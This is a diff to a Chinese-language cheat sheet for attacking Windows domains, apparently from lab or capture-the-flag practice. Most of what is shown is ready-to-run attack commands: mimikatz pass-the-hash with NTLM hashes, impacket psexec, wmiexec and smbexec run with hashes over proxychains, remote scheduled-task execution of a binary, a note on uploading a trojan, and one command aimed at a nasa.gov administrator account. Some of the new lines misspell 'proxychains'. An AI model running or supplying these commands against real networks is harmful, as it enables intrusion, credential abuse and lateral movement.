@@ -97,6 +97,13 @@ set smbuser administrator
 set smbpass 10c7c7894091834u1074eefddcef89ed79ec9f
 # 可以设置 payload 攻击时反弹也可不设置
 ```
+### PrivescCheck
+
+检查有没有注册表相关选项.
+
+```bash
+domain_elevate\root_by_registry.sh
+```
 
 ### 2.黄金票据
 
@@ -202,6 +209,8 @@ DAY36 内网域渗透 「更新中」.mp4
 ```sh
 wmic qfe get hotfixid | findstr KB3011780 # 无补丁  则 ms14-068 提权
 ```
+### 注册表提权
+
 
 ## 攻击
 
@@ -271,15 +280,16 @@ schtasks /create /tn "test123456" /tr C:\srn7final.exe /sc once /st 14.25 /S 192
 ```sh
 # pth 传递弹出cmd
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
+
 # 本地 /domain:. 如果有域要填好
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:. /ntlm:ef39e54205b68e286a65bbe69d2dab92 /run:mstsc.exe /restrictedadmin" "exit"
 mimikatz.exe sekurlsa::pth /user:fuwuqi /domain:172.16.235.6 /ntlm:f9272c84db38a009439ba30fb23ecb2d /run:mstsc.exe /restrictedadmin
 # pth 读取数据
 proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 # pth 攻击
-python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.32 "whoami"
-python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
-python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
+proxychians python psexec.py  -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
+proxychians python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
+proxychians python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
 ```
 
 pth 连接后上传马
@@ -405,7 +415,7 @@ net use P: \\Name\zhq3211
  ! {cmd}                    - executes a local shell cmd
 
 proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090 nasa.gov/administrator@10.10.10.140 -codec gbk
-            python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
+proxychains python wmiexec.py -hashes 00000000000000000000000000000000:1a19251fbd935969832616366ae3fe62 Administrator@172.22.2.3
 ```
 
 # Article
